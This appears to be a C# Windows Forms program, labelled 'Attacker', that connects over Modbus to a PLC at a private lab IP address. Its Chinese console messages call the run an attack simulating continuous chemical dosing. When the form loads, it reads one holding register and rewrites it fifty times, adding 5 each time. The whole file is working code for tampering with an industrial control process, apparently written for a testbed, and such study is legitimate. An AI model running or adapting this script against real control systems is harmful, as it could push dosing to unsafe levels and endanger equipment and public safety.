﻿using EasyModbus;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Attacker
{
    public partial class Form1 : Form
    {
        //ModbusClient attackerClient = new ModbusClient("192.168.0.103", 502);
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //ModbusClient attackerClient = new ModbusClient("172.20.10.2", 502);
           ModbusClient attackerClient = new ModbusClient("192.168.0.103", 502);
            try
            {
                attackerClient.Connect();
                Console.WriteLine("攻擊者已連線到 PLC，開始模擬持續加藥劑...");

                int address = 8 ;       
                int interval = 2000;   

                for (int i = 0; i < 50 ; i++) 
                {
                    int current = attackerClient.ReadHoldingRegisters(address, 1)[0];
                    int newValue = current + 5 ; 

                    attackerClient.WriteSingleRegister(address, newValue);

                    Console.WriteLine($"第 {i + 1} 次攻擊：讀取 {current}，寫入 {newValue}");

                    Thread.Sleep(interval);
                }

                attackerClient.Disconnect();
                Console.WriteLine("攻擊結束");
            }
            catch (Exception ex)
            {
                Console.WriteLine("攻擊失敗：" + ex.Message);
            }
        }
    }
}
